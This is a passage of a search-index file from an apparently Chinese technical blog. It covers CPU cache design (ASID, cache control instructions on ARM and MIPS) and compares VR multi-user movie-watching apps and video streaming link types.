<p>\u65e2\u7136\u65e0\u6cd5\u76f4\u63a5\u4ece\u865a\u62df\u5730\u5740\u4e2d\u5224\u65ad\u5b83\u5c5e\u4e8e\u54ea\u4e2a\u8fdb\u7a0b\uff0c\u90a3\u4e48\u5c31\u4e3a\u6bcf\u4e2a\u8fdb\u7a0b\u8d4b\u4e00\u4e2a\u7f16\u53f7\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u4e2d\u4ea7\u751f\u7684\u865a\u62df\u5730\u5740\u90fd\u9644\u4e0a\u8fd9\u4e2a\u7f16\u53f7\uff0c\u8fd9\u4e2a\u7f16\u53f7\u5c31\u76f8\u5f53\u4e8e\u662f\u865a\u62df\u5730\u5740\u7684\u4e00\u90e8\u5206\uff0c\u8fd9\u6837\u4e0d\u540c\u8fdb\u7a0b\u7684\u865a\u62df\u5730\u5740\u5c31\u80af\u5b9a\u662f\u4e0d\u4e00\u6837\u4e86\u3002\u8fd9\u4e2a\u7f16\u53f7\u79f0\u4e3a PID(Process ID),\u5f53\u7136\u66f4\u901a\u7528\u7684\u53eb\u6cd5\u662f ASID(Address Space IDentifier)</p> <p>\u540c\u65f6 TLB \u4e2d\u8fd8\u6dfb\u52a0\u4e86 global \u4f4d\uff0c\u5982\u679c G \u4f4d\u4e3a 1\uff0c\u5219\u5ffd\u7565 ASID\uff0c\u7528\u4e8e\u5b9e\u73b0\u5168\u5c40\u5171\u4eab\u3002</p>","tags":["cpu","cache","VIPT"]},{"location":"%E5%8D%9A%E5%AE%A2/2023/09/01/2023-09-01-%E5%86%8D%E6%AC%A1%E7%90%86%E8%A7%A3Cache%E8%AE%BE%E8%AE%A1/#cache-\u63a7\u5236\u6307\u4ee4","title":"cache \u63a7\u5236\u6307\u4ee4","text":"<p>\u53ef\u80fd\u5b58\u5728\u4e00\u4e9b\u64cd\u4f5c\uff0c\u53ef\u80fd\u5bfc\u81f4 cache \u4e2d\u6570\u636e\u548c ram \u4e2d\u4e0d\u4e00\u81f4\uff0c\u9700\u8981\u624b\u52a8\u7ba1\u7406 cache</p> <p>cache \u4e00\u81f4\u6027</p> <ul> <li>DMA<ul> <li>src \u5982\u679c dirty\uff0c\u9700\u8981\u5199\u56de\u5185\u5b58</li> <li>\u5199\u5165 dst \u540e\uff0c\u9700\u8981\u65e0\u6548\u6389 cache \u4fdd\u8bc1\u8bfb\u5230\u6700\u65b0\u6570\u636e</li> </ul> </li> <li>\u81ea\u4fee\u6539\u7a0b\u5e8f\u3002\u7a0b\u5e8f\u53ef\u80fd\u6709\u65f6\u9700\u8981\u52a8\u6001\u751f\u6210\u6307\u4ee4\u6267\u884c\uff0c\u751f\u6210\u7684\u6307\u4ee4\u4f1a\u4f5c\u4e3a\u6570\u636e\u5199\u5165 d cache \u4e2d\u3002\u7531\u4e8e i cache \u548c d cache \u95f4\u4e0d\u4f1a\u81ea\u52a8\u540c\u6b65<ul> <li>\u8981\u60f3\u6267\u884c\u8fd9\u4e9b\u6307\u4ee4\uff0c\u9700\u8981\u5c06\u6570\u636e\u5199\u56de\u5185\u5b58\uff0c\u5e76\u65e0\u6548\u6389 i-cache \u4e2d\u5bf9\u5e94\u6307\u4ee4\u3002</li> </ul> </li> <li>\u6709\u65f6\u5c31\u662f\u9700\u8981\u5c06 cache \u4e2d dirty \u90e8\u5206\u5199\u56de\u5185\u5b58\uff0c\u6bd4\u5982 page fault \u65f6\u66ff\u6362\u6389 dirty \u7684\u9875\u3002</li> </ul> <p>cache \u64cd\u4f5c\u53ef\u4ee5\u603b\u7ed3\u4e3a\u51e0\u79cd\uff1aclean\uff0c\u65e0\u6548 (l) \u80fd\u591f\u5c06 I-Cache \u5185\u7684\u6240\u6709 Cache Line \u90fd\u7f6e\u4e3a\u65e0\u6548\uff1b (2) \u80fd\u591f\u5c06 I-Cache \u5185\u7684\u67d0\u4e2a Cache Line \u7f6e\u4e3a\u65e0\u6548\uff1b (3) \u80fd\u591f\u5c06 D-Cache \u5185\u7684\u6240\u6709 Cache Line \u8fdb\u884c clean; (4) \u80fd\u591f\u5c06 D-Cache \u5185\u7684\u67d0\u4e2a Cache Line \u8fdb\u884c clean; (5) \u80fd\u591f\u5c06 D-Cache \u5185\u7684\u6240\u6709 Cache Line \u8fdb\u884c clean\uff0c\u5e76\u7f6e\u4e3a\u65e0\u6548\uff1b (6) \u80fd\u591f\u5c06 D-Cache \u5185\u7684\u67d0\u4e2a Cache Line \u8fdb\u884c clean\uff0c\u5e76\u7f6e\u4e3a\u65e0\u6548\u3002</p> <p>\u5b9a\u4f4d cache line \u6709\u51e0\u79cd\u65b9\u5f0f</p> <ul> <li>set/way</li> <li>\u5730\u5740\uff08\u6839\u636e cache \u7c7b\u578b\uff0c\u53ef\u80fd\u662f\u865a\u62df\u5730\u5740\u4e5f\u53ef\u80fd\u662f\u7269\u7406\u5730\u5740\uff09</li> </ul>","tags":["cpu","cache","VIPT"]},{"location":"%E5%8D%9A%E5%AE%A2/2023/09/01/2023-09-01-%E5%86%8D%E6%AC%A1%E7%90%86%E8%A7%A3Cache%E8%AE%BE%E8%AE%A1/#arm","title":"ARM","text":"<p>ARM \u4f7f\u7528 CP15 \u534f\u5904\u7406\u5668\uff08\u901a\u8fc7\u63a7\u5236\u5176\u5bc4\u5b58\u5668\u6765\u7ba1\u7406 cache\uff09</p> <pre><code>MRC{&lt;cond&gt;)&lt;coproc&gt;,&lt;Op1&gt;,&lt;Rt&gt;,CRn&gt;,CRm&gt;,&lt;Op2&gt;}\nMCR[&lt;cond&gt;)&lt;coproc&gt;,&lt;Op1&gt;,&lt;Rt&gt;,CRn&gt;,CRm&gt;,&lt;Op2&gt;)\n</code></pre> <p>MRC \u6307\u4ee4\u5c06\u534f\u5904\u7406\u5668\u4e2d\u67d0\u4e2a\u5bc4\u5b58\u5668\u7684\u5185\u5bb9\u653e\u5230\u5904\u7406\u5668\u5185\u90e8\u6307\u5b9a\u7684\u901a\u7528\u5bc4\u5b58\u5668\u4e2d\uff0c MCR \u6307\u4ee4\u5c06\u5904\u7406\u5668\u5185\u90e8\u67d0\u4e2a\u901a\u7528\u5bc4\u5b58\u5668\u7684\u5185\u5bb9\u653e\u5230\u534f\u5904\u7406\u5668\u5185\u90e8\u6307\u5b9a\u7684\u5bc4\u5b58\u5668\u4e2d</p> <p></p>","tags":["cpu","cache","VIPT"]},{"location":"%E5%8D%9A%E5%AE%A2/2023/09/01/2023-09-01-%E5%86%8D%E6%AC%A1%E7%90%86%E8%A7%A3Cache%E8%AE%BE%E8%AE%A1/#mips","title":"MIPS","text":"<p>MIPS \u4e2d\u4f7f\u7528 CACHE \u6307\u4ee4</p> <p></p> <p>\u683c\u5f0f\u548c load\uff0cstore \u6307\u4ee4\u7c7b\u4f3c\uff0c\u8ba1\u7b97 Effective address<code>EA = GPR[base] + offset</code> </p>","tags":["cpu","cache","VIPT"]},{"location":"%E5%8D%9A%E5%AE%A2/2023/09/01/2023-09-01-%E5%86%8D%E6%AC%A1%E7%90%86%E8%A7%A3Cache%E8%AE%BE%E8%AE%A1/#\u53c2\u8003\u8d44\u6599","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> <li>\u8d85\u6807\u91cf\u5904\u7406\u5668\u8bbe\u8ba1\uff0c\u59da\u6c38\u658c\uff0c\u6e05\u534e\u5927\u5b66\u51fa\u7248\u793e</li> </ul>","tags":["cpu","cache","VIPT"]},{"location":"%E5%8D%9A%E5%AE%A2/2024/05/25/VR%20%E5%A4%9A%E4%BA%BA%E8%A7%82%E5%BD%B1%E6%96%B9%E6%A1%88%E6%8E%A2%E7%A9%B6/","title":"VR \u591a\u4eba\u89c2\u5f71","text":"<p>VR \u6bd4\u8f83\u5e38\u89c1\u7684\u4e00\u4e2a\u529f\u80fd\u4fbf\u662f\u62ff\u6765\u770b\u770b\u89c6\u9891\uff0c\u5de8\u5927\u7684\u5c4f\u5e55\u4ee5\u53ca\u53ef\u4ee5\u5207\u6362\u7684\u5404\u79cd\u62df\u771f\u573a\u666f\uff0c\u90fd\u53ef\u4ee5\u5e26\u6765\u975e\u5e38\u9ad8\u7684\u6c89\u6d78\u611f\u3002\u800c\u591a\u4eba\u89c2\u5f71\uff0c\u5219\u4f7f\u5f97\u8fd9\u4e2a\u529f\u80fd\u66f4\u8fd1\u4e00\u6b65\u3002\u5728\u591a\u4eba\u89c2\u5f71\u5e94\u7528\u4e2d\uff0c\u73a9\u5bb6\u53ef\u4ee5\u521b\u5efa\u865a\u62df\u623f\u95f4\uff0c\u522b\u4eba\u53ef\u4ee5\u52a0\u5165\u8fd9\u4e2a\u623f\u95f4\u89c2\u770b\u540c\u4e00\u90e8\u7535\u5f71\u3002\u5728\u865a\u62df\u573a\u666f\u4e2d\uff0c\u73a9\u5bb6\u53ef\u4ee5\u770b\u5230\u5bf9\u9762\u7684\u865a\u62df\u5f62\u8c61\u505a\u51fa\u7684\u5404\u79cd\u52a8\u4f5c\uff0c\u4e5f\u53ef\u4ee5\u542c\u5230\u5bf9\u9762\u5e26\u6709\u65b9\u4f4d\u611f\u7684\u7acb\u4f53\u7684\u58f0\u97f3\uff0c\u8ba9\u4eba\u611f\u89c9\u5bf9\u65b9\u4eff\u4f5b\u5c31\u5728\u773c\u524d\u4e00\u6837\u3002</p> <p>\u5bf9\u6211\u6765\u8bf4\uff0cVR \u591a\u4eba\u89c2\u5f71\u7684\u6700\u5927\u4f18\u70b9\u53ef\u80fd\u662f\u53ef\u4ee5\u7a81\u7834\u65f6\u95f4\u7a7a\u95f4\u7684\u9650\u5236\uff0c\u52a0\u5f3a\u4eba\u4e0e\u4eba\u4e4b\u95f4\u7684\u8fde\u63a5\u3002\u6bd5\u7adf\u73b0\u5b9e\u4e2d\u60f3\u8981\u548c\u597d\u53cb\u7279\u522b\u662f\u5f02\u5730\u7684\u597d\u53cb\u4e00\u8d77\u770b\u7535\u5f71\u5b9e\u5728\u592a\u96be\u4e86\uff0c\u800c\u5728 VR \u4e2d\u5374\u53ef\u4ee5\u8f7b\u6613\u505a\u5230\u3002 \u6211\u76f8\u4fe1\uff0c\u8fd9\u79cd\u52a0\u5f3a\u4eba\u4e0e\u4eba\u7684\u94fe\u63a5\uff0c\u5fc5\u7136\u662f VR \u672a\u6765\u53d1\u5c55\u7684\u5f88\u91cd\u8981\u7684\u4e00\u4e2a\u65b9\u5411\u3002\uff08\u6bd4\u5982\u5728 VRChat \u4e2d\uff0c\u73a9\u5bb6\u80fd\u505a\u5230\u7684\u4e0d\u4ec5\u662f\u4e00\u8d77\u89c2\u5f71\uff0c\u8fd8\u80fd\u4e00\u8d77\u73a9\u6e38\u620f\u3001\u4e00\u8d77\u901b\u56fe\u751a\u81f3\u4e00\u8d77\u966a\u4f34\u7761\u89c9\u3002\u786e\u5b9e\u80fd\u77a5\u89c1\u4e00\u70b9\u5143\u5b87\u5b99\u7684\u5f71\u5b50\uff09</p> <p>\u56de\u5230\u6b63\u9898\uff0c\u7531\u4e8e\u76ee\u524d VR \u8fd8\u5904\u4e8e\u4e00\u4e2a\u5f00\u62d3\u533a\uff0c\u8bb8\u591a\u5e94\u7528\u90fd\u6ca1\u6709\u5b8c\u5168\u660e\u786e\u7684\u5f62\u6001\u3002\u9488\u5bf9 VR \u591a\u4eba\u89c2\u5f71\uff0c\u5e76\u6ca1\u6709\u975e\u5e38\u6210\u719f\u7684\u5e94\u7528\uff0c\u4e0d\u540c\u8f6f\u4ef6\u4fa7\u91cd\u7684\u529f\u80fd\u4e0d\u540c\u3002\u4ee5\u4e0b\u662f\u6211\u5bf9\u8bd5\u8fc7\u7684\u4e00\u4e9b\u65b9\u6848\u7684\u603b\u7ed3</p>","tags":["vr","vrchat","hls"]},{"location":"%E5%8D%9A%E5%AE%A2/2024/05/25/VR%20%E5%A4%9A%E4%BA%BA%E8%A7%82%E5%BD%B1%E6%96%B9%E6%A1%88%E6%8E%A2%E7%A9%B6/#\u73b0\u6709\u65b9\u6848\u603b\u7ed3","title":"\u73b0\u6709\u65b9\u6848\u603b\u7ed3","text":"<ul> <li>Pico \u89c6\u9891\u591a\u4eba\u89c2\u5f71<ul> <li>\u64ad\u653e\u5185\u5bb9<ul> <li>Pico \u89c6\u9891\u5185\u7684\u8d44\u6e90</li> <li>\u5404\u7c7b\u652f\u6301 tv \u6295\u5c4f\u7684\u5e94\u7528\u3002\u7279\u522b\u7684\uff0c\u652f\u6301\u7f51\u76d8\uff08\u56e0\u6b64\u53ef\u4ee5\u6295\u7528\u6237\u4e0b\u8f7d\u7684\u8d44\u6e90\uff09</li> </ul> </li> <li>\u4f18\u70b9<ul> <li>\u6709\u7b80\u6613\u7684 avatar\uff082024/06 Pico \u66f4\u65b0 Avatar SDK v2.0.0 \u540e\uff0c\u793e\u533a\u53ef\u4ee5\u4e0a\u4f20\u81ea\u5b9a\u4e49\u7684\u6a21\u578b\uff0c\u6570\u91cf\u975e\u5e38\u4e30\u5bcc\u3002\u6bd4\u5982\u5168\u5458\u4f7f\u7528\u5047\u9762\u9a91\u58eb\u5f62\u8c61\u770b\u7279\u6444\uff09</li> <li>\u652f\u6301\u82e5\u5e72\u573a\u666f\u5207\u6362\uff1a\u7535\u5f71\u9662\u3001\u6c99\u6ee9\u7b49</li> <li>\u6295\u5c4f\u652f\u6301 4K\uff0c\u6e05\u6670\u5ea6\u6bd4\u8f83\u9ad8</li> <li>\u5934\u6234\u7aef\u5e94\u7528\uff0c\u4e0d\u9700\u8981 PC</li> <li>\u652f\u6301 3d \u89c6\u9891</li> </ul> </li> <li>\u7f3a\u70b9<ul> <li>\u53ea\u80fd DLNA \u6295\u5c4f\u5c11\u6570\u767d\u540d\u5355\u7f51\u7ad9\uff1aB \u7ad9\u3001\u7231\u5947\u827a\uff08\u76ee\u524d\u4e0d\u652f\u6301\uff0c\u4e4b\u540e\u4f1a\u652f\u6301\uff09\uff0c\u767e\u5ea6\u3001\u963f\u91cc\uff08\u522b\u7528\u4e86\uff0c\u4f1a\u88ab\u6c38\u4e45\u5c01\u53f7\uff09\u3001\u5938\u514b\u7f51\u76d8\u7b49\u3002\u5e76\u4e14\u5b98\u65b9\u6ca1\u6709\u5c06\u5176\u516c\u5e03\u5728\u7f51\u4e0a\u3002</li> <li>\u6709\u5185\u5bb9\u5ba1\u67e5\uff08\u867d\u7136\u4e5f\u7b97\u4e0d\u4e0a\u7f3a\u70b9\uff0c\u4f46\u786e\u5b9e\u81ea\u7531\u5ea6\u6ca1\u6709\u90a3\u4e48\u9ad8\uff09</li> <li>\u9700\u8981\u7f51\u76d8\u4f1a\u5458\u624d\u6709\u597d\u4f53\u9a8c\uff1a\u7f51\u76d8\u6295\u5c4f\u65b9\u5f0f\u4e0d\u5145\u5bf9\u5e94\u8f6f\u4ef6\u4f1a\u5458\uff0c\u57fa\u672c\u53ea\u80fd 720p \u6295\u5c4f</li> <li>\u4e0d\u652f\u6301\u5b57\u5e55\uff0c\u89c6\u9891\u5fc5\u987b\u63d0\u524d\u5c06\u5b57\u5e55\u70e7\u5f55\u5230\u753b\u9762\u4e2d</li> <li>\u6ca1\u6d4b\uff1a\u4e0d\u77e5\u9053\u662f\u5426\u652f\u6301\u97f3\u8f68\u5207\u6362</li> </ul> </li> </ul> </li> </ul> <ul> <li>VRChat<ul> <li>\u64ad\u653e\u5185\u5bb9<ul> <li>\u89c6\u9891\u76f4\u94fe\uff08\u7c7b\u4f3c\u4e8e<code>http://something.com/video.mp4</code>\uff09</li> <li>\u5404\u79cd\u6d41\u5a92\u4f53\u7f51\u7ad9\uff08\u5982<code>https://youtube.com/watch?v=VIDEOID</code>\uff0c\u539f\u7406\u662f\u4f7f\u7528 yt-dlp \u5de5\u5177\u89e3\u6790\u51fa\u89c6\u9891\u76f4\u94fe\uff09\uff1a\u5305\u542b B \u7ad9\u3001youtube\u3001twitch\u76f4\u64ad\u7b49</li> </ul> </li> <li>\u4f18\u70b9<ul> <li>\u4e0d\u53ea\u662f\u770b\u7535\u5f71\uff1b\u65e0\u6570\u7684 avatar \u548c \u65e0\u6570\u7684 world\uff08\u573a\u666f\uff09\u53ef\u4ee5\u9009\u62e9\uff0c\u5728\u573a\u666f\u4e2d\u53ef\u4ee5\u6709\u4e30\u5bcc\u7684\u4ea4\u4e92</li> <li>\u76f4\u94fe\u610f\u5473\u7740\u53ef\u4ee5\u81ea\u5df1\u4f7f\u7528\u670d\u52a1\u5668 host \u60f3\u8981\u5206\u4eab\u7684\u89c6\u9891</li> <li>\u6ca1\u6709\u5ba1\u67e5\u3002\u9ed8\u8ba4\u6709\u767d\u540d\u5355\u673a\u5236\uff0c\u975e\u767d\u540d\u5355\u7684\u57df\u540d\u9ed8\u8ba4\u4e0d\u4f1a\u64ad\u653e\uff0c\u4f46\u662f\u7528\u6237\u53ef\u4ee5\u624b\u52a8\u5173\u95ed\u767d\u540d\u5355</li> </ul> </li> <li>\u7f3a\u70b9<ul> <li>\u89c2\u611f\u4e0d\u592a\u6e05\u6670<ul> <li>VRChat \u672c\u8eab\u6e32\u67d3\u5206\u8fa8\u7387\u7684\u7f18\u6545\uff0c\u9700\u8981\u5f88\u9ad8\u7aef\u7684\u663e\u5361\u624d\u80fd\u63d0\u9ad8\u5206\u8fa8\u7387</li> <li>\u64ad\u653e\u5668\u8c8c\u4f3c\u672c\u8eab\u4e5f\u9650\u5236\u5206\u8fa8\u7387\uff0c\u53ea\u6709 480p, 720p, 1080p \u53ef\u9009\uff08\u611f\u89c9\u53ef\u80fd\u53ea\u662f\u4e00\u4e2a\u5916\u89c2\u6309\u94ae\uff0c\u6bd5\u7adf\u81ea\u5df1\u670d\u52a1\u5668 streaming \u7684\u5185\u5bb9\uff0c\u7801\u7387\u7b49\u90fd\u662f\u670d\u52a1\u7aef\u63a7\u5236\u7684\uff0c\u64ad\u653e\u5668\u7aef\u4e0d\u5e94\u8be5\u4f1a\u518d\u8f6c\u7801\u4e00\u6b21\uff09</li> </ul> </li> <li>\u64ad\u653e\u5668\u4e0d\u5b8c\u5584<ul> <li>\u4e0d\u652f\u6301\u5916\u6302\u5b57\u5e55\uff0c\u53ea\u652f\u6301\u5c06\u5b57\u5e55\u70e7\u5f55\u5230\u89c6\u9891\u4e2d\u3002\uff08\u6709\u9879\u76ee\u652f\u6301\u4e86\uff0c\u4f46\u662f\u6211\u6ca1\u6210\u529f\uff09</li> <li>\u4e0d\u652f\u6301\u5207\u6362\u97f3\u8f68</li> <li>p.s. VLC \u64ad\u653e\u5668\u4f7f\u7528\u540c\u6837\u7684 url \u662f\u5747\u652f\u6301\u7684\uff0c\u8bf4\u660e\u95ee\u9898\u662f\u53ef\u4ee5\u89e3\u51b3\u7684\uff0c\u6240\u4ee5\u672a\u6765\u53ef\u671f</li> </ul> </li> <li>\u76ee\u524d\u6ca1\u6709 3d \u7684\u64ad\u653e\u5668\uff0c\u53ea\u80fd\u5206\u4eab 2d \u89c6\u9891</li> </ul> </li> </ul> </li> </ul> <ul> <li>bigscreen\uff1a\u4e00\u4e2a\u4e13\u95e8\u7528\u4e8e\u591a\u4eba\u89c2\u5f71\u7684\u8f6f\u4ef6Steam \u4e0a\u7684 Bigscreen Beta (steampowered.com)<ul> <li>\u64ad\u653e\u5185\u5bb9<ul> <li>\u7535\u8111\u5c4f\u5e55</li> <li>\u7535\u8111\u672c\u5730\u89c6\u9891</li> <li>youtube\uff0ctwitch \u7b49\u5185\u5bb9</li> </ul> </li> <li>\u4f18\u70b9<ul> <li>\u64ad\u653e\u5185\u5bb9\u5f88\u5f00\u653e\uff0c\u5f88\u5bb9\u6613\u64ad\u653e\u81ea\u5df1\u4e0b\u8f7d\u7684\u5185\u5bb9\u3002\u751a\u81f3\u5206\u4eab\u7535\u8111\u5c4f\u5e55</li> <li>\u573a\u666f\u5f88\u4e30\u5bcc\uff1a\u6709\u4ed8\u8d39\u573a\u666f\u548c\u514d\u8d39\u573a\u666f\uff08\u5176\u4e2d\u4e00\u4e2a\u6559\u5ba4\u573a\u666f\u89c2\u611f\u5f88\u4e0d\u9519\uff09</li> <li>\u652f\u6301 3d \u89c6\u9891</li> </ul> </li> <li>\u7f3a\u70b9<ul> <li>\u6e05\u6670\u5ea6\u8fd8\u662f\u4f4e\u4e86\u70b9\uff0c\u6700\u9ad8\u7801\u7387\u4e3a 5m</li> </ul> </li> </ul> </li> </ul> <p>\u5176\u5b9e\u4ece\u539f\u7406\u4e0a\uff0c\u4e0a\u9762\u5e94\u7528\u53ef\u4ee5\u5206\u4e3a\u4e24\u7c7b\u3002</p> <ul> <li>\u4e00\u7c7b\u662f\u5e94\u7528\u5382\u5546\u63d0\u4f9b\u4e32\u6d41\u670d\u52a1\u5668\u7684\u3002bigscreen \u5c31\u5c5e\u4e8e\u8fd9\u79cd\uff0c\u5b83\u7684\u6700\u5927\u4f18\u52bf\u662f\u7528\u6237\u53ef\u4ee5\u5206\u4eab\u81ea\u5df1\u7684\u5c4f\u5e55\u3002\u8fc7\u7a0b\u5176\u5b9e\u662f\u623f\u4e3b\u5c06\u81ea\u5df1\u7684\u753b\u9762\u63a8\u6d41\u5230 bigscreen \u670d\u52a1\u5668\uff0c\u5176\u5b83\u7528\u6237\u518d\u4ece bigscreen \u83b7\u5f97\u753b\u9762\u3002\u8fd9\u672c\u8d28\u4e0a\u662f\u4e00\u79cd\u76f4\u64ad\u3002</li> <li>\u53e6\u4e00\u7c7b\u5c31\u662f\u50cf Pico \u89c6\u9891\u548c VRChat \u8fd9\u79cd\u4e0d\u63d0\u4f9b\u4e32\u6d41\u670d\u52a1\u5668\u7684\u3002\u5b83\u4eec\u672c\u8eab\u4e0d\u9700\u8981\u670d\u52a1\u5668\u5b58\u50a8\u89c6\u9891\uff0c\u7528\u6237\u90fd\u662f\u901a\u8fc7\u89c6\u9891\u94fe\u63a5\u8bbf\u95ee\u5df2\u6709\u7684\u89c6\u9891\u7f51\u7ad9\uff0c\u56e0\u6b64\u6210\u672c\u66f4\u4f4e\u4e9b\u3002</li> </ul> <p>\u7406\u8bba\u4e0a\u6700\u65b9\u4fbf\u6700\u5f3a\u5927\u7684\u80af\u5b9a\u662f bigscreen \u8fd9\u79cd\uff0c\u4f46\u662f\u7531\u4e8e\u4e32\u6d41\u670d\u52a1\u5668\u5b58\u50a8\u548c\u5e26\u5bbd\u7684\u9ad8\u6602\u6210\u672c\uff0c\u514d\u8d39\u7528\u6237\u5fc5\u7136\u4f1a\u53d7\u5230\u8bb8\u591a\u9650\u5236\u3002\u56e0\u6b64\u6211\u89c9\u5f97\u66f4\u5b9e\u9645\u7684\u8fd8\u662f\u540e\u8005\u3002\u5176\u5b9e\u5bf9\u4e8e\u89c2\u770b\u5927\u90e8\u5206\u6b63\u89c4\u6b63\u7248\u8d44\u6e90\uff0cpico \u89c6\u9891\u5df2\u7ecf\u6ca1\u4ec0\u4e48\u95ee\u9898\uff08\u8981\u4e48\u89c2\u770b Pico \u89c6\u9891\u81ea\u5e26\u7684\u8d44\u6e90\uff0c\u8981\u4e48\u4f7f\u7528\u5176\u5b83\u8f6f\u4ef6\u6295\u5c4f\uff09\u3002\u7136\u800c\u56e0\u4e3a\u56fd\u5185\u7684\u5ba1\u67e5\u653f\u7b56\uff0c\u5bfc\u81f4\u5f88\u591a\u5373\u4f7f\u6b63\u89c4\u7684\u5185\u5bb9\u56fd\u5185\u5e73\u53f0\u4e0d\u4e00\u5b9a\u5f15\u8fdb\uff0c\u5f15\u8fdb\u4e86\u4e5f\u53ef\u80fd\u5220\u51cf\u3002\u56e0\u6b64 VRChat \u66f4\u52a0\u5f00\u653e\u8fd9\u4e00\u70b9\u8fd8\u662f\u4e0d\u53ef\u7f3a\u5c11\u7684\u3002</p> <p>\u89c6\u9891\u94fe\u63a5\u53c8\u53ef\u4ee5\u5206\u4e3a\u4e24\u7c7b</p> <ul> <li>\u4e00\u7c7b\u662f\u89c6\u9891\u76f4\u94fe\uff0c\u4e5f\u5c31\u662f\u94fe\u63a5\u76f4\u63a5\u6307\u5411 .mp4 \u6216\u8005 .webm\u89c6\u9891\u6587\u4ef6\u3002\u800c\u8981\u53d6\u5f97\u8fd9\u6837\u7684\u94fe\u63a5\u6709\u8bb8\u591a\u65b9\u6cd5<ul> <li>\u81ea\u5df1\u8d2d\u4e70\u670d\u52a1\u5668\u5b58\u653e\u89c6\u9891\uff0c\u5e76\u521b\u5efa HTTP \u670d\u52a1\u5668\u63d0\u4f9b\u8bbf\u95ee\uff08\u6bd4\u5982\u4f7f\u7528 nginx\uff09</li> <li>\u4f7f\u7528 youtube\uff0cbilibili \u7b49\u6d41\u5a92\u4f53\u5e73\u53f0\u7684\u94fe\u63a5\u3002\u8fd9\u4e9b\u94fe\u63a5\u867d\u7136\u4e0d\u6307\u5411\u89c6\u9891\u6587\u4ef6\uff0c\u4f46\u662f VRC \u64ad\u653e\u5668\u5185\u90e8\u4f1a\u4f7f\u7528 yt-dlp \u5de5\u5177\u89e3\u6790\u51fa\u5176\u4e2d\u7684\u89c6\u9891\u76f4\u94fe\u3002</li> <li>\u4f7f\u7528\u4e91\u76d8\u5b58\u50a8\u89c6\u9891\uff0c\u5e76\u83b7\u5f97\u76f4\u94fe\u3002\u867d\u7136\u4e91\u76d8\u901a\u5e38\u4e0d\u63d0\u4f9b\u89c6\u9891\u76f4\u94fe\uff0c\u751a\u81f3\u4f1a\u6253\u51fb\u83b7\u53d6\u76f4\u94fe\u7684\u63d2\u4ef6\uff08\u6bd4\u5982\u767e\u5ea6\u7f51\u76d8\uff09\u3002\u4f46\u662f\u8fd8\u662f\u6709\u4e00\u4e9b\u4e91\u670d\u52a1\u5546\u63d0\u4f9b\u4e86\u76f4\u94fe\u7684\u529f\u80fd\uff0c\u6bd4\u5982 googledrive</li> <li>\u4f7f\u7528\u4e00\u4e9b\u89c6\u9891\u6258\u7ba1\u7f51\u7ad9\u6bd4\u5982 Vimeo\uff08VRC \u5b98\u65b9\u652f\u6301\u7684\u7f51\u7ad9\uff09\u3002\u7528\u6237\u4e0a\u4f20\u89c6\u9891\u5230\u7f51\u7ad9\uff0c\u7f51\u7ad9\u63d0\u4f9b\u89c6\u9891\u94fe\u63a5\u3002\u540c\u6837\uff0c\u514d\u8d39\u7528\u6237\u4e00\u822c\u6709\u5b58\u50a8\u7a7a\u95f4\u9650\u5236\u3002</li> </ul> </li> <li>\u53e6\u4e00\u7c7b\u662f\u76f4\u64ad\u94fe\u63a5\u3002\u76f4\u64ad\u94fe\u63a5\u901a\u5e38\u91c7\u7528 HLS \u534f\u8bae\uff0c\u94fe\u63a5\u6307\u5411\u4e00\u4e2a m3u8 \u6587\u4ef6\uff0c\u6587\u4ef6\u5b58\u50a8\u4e86\u5207\u7247\u540e\u7684\u89c6\u9891\u76f4\u94fe\uff08\u901a\u5e38\u5c01\u88c5\u6210 ts \u683c\u5f0f\uff09\u3002VRC \u64ad\u653e\u5668\uff08\u5982 USharpVideo\uff09\u90fd\u652f\u6301 m3u8 \u94fe\u63a5\u7684\u64ad\u653e\uff0c\u9700\u8981\u5728\u754c\u9762\u9009\u62e9\u4e3a Streaming\u3002<ul> <li>\u76f4\u64ad\u94fe\u63a5\u548c\u89c6\u9891\u76f4\u94fe\u7684\u533a\u522b\u5728\u4e8e\uff0c\u89c6\u9891\u76f4\u94fe\u7684\u6587\u4ef6\u5185\u5bb9\u662f\u56fa\u5b9a\u7684\uff0c\u800c\u76f4\u64ad\u94fe\u63a5\u4e2d m3u8 \u5185\u5bb9\u662f\u52a8\u6001\u751f\u6210\u7684\u3002</li> <li>\u4ee5 B \u7ad9\u76f4\u64ad\u4e3a\u4f8b\uff0c\u76f4\u64ad\u8005\u901a\u8fc7 OBS \u7b49\u8f6f\u4ef6\u5c06\u753b\u9762\u7f16\u7801\u540e\uff0c\u901a\u8fc7 RTMP \u534f\u8bae\u63a8\u6d41\u5230 B \u7ad9\u7684\u670d\u52a1\u5668\uff08 <code>rtmp://dl.live-send.acg.tv/live-dl</code>\uff09\uff0cB \u7ad9\u53ef\u4ee5\u5bf9\u89c6\u9891\u8fdb\u884c\u5b58\u50a8\uff08\u4e5f\u5c31\u662f\u76f4\u64ad\u56de\u653e\u529f\u80fd\uff09\uff0c\u540c\u65f6\u63d0\u4f9b HLS \u8bbf\u95ee\u3002\u89c2\u770b\u8005\u4f7f\u7528\u6d4f\u89c8\u5668\u901a\u8fc7 HLS \u534f\u8bae\u4ece B \u7ad9\u670d\u52a1\u5668\u83b7\u53d6\u76f4\u64ad\u5185\u5bb9\u3002</li> </ul> </li> </ul> <p>\u4ee5\u4e0b\u662f\u5b83\u4eec\u4f18\u7f3a\u70b9\u7684\u4ecb\u7ecd</p> <p>\u89c6\u9891\u76f4\u94fe</p> <ul> <li>\u4f18\u70b9<ul> <li>\u7b80\u5355\u76f4\u63a5</li> <li>\u81ea\u5df1 host \u7b80\u5355\uff0c\u53ea\u9700\u8981\u642d\u5efa\u4e00\u4e2a HTTP \u670d\u52a1\u5668\u5373\u53ef</li> </ul> </li> <li>\u7f3a\u70b9<ul> <li>\u4e3a\u4e86\u83b7\u5f97\u6700\u597d\u7684\u517c\u5bb9\u6027\uff0c\u5bf9\u89c6\u9891\u683c\u5f0f\u6709\u8bb8\u591a\u8981\u6c42\u3002\u5c01\u88c5\u683c\u5f0f\u5efa\u8bae\u4f7f\u7528 mp4\uff0c\u7f16\u7801\u683c\u5f0f\u5efa\u8bae\u4f7f\u7528 h264\u3002\u5b57\u5e55\u5efa\u8bae\u76f4\u63a5\u70e7\u5f55\u5230\u753b\u9762\u4e2d\u3002</li> 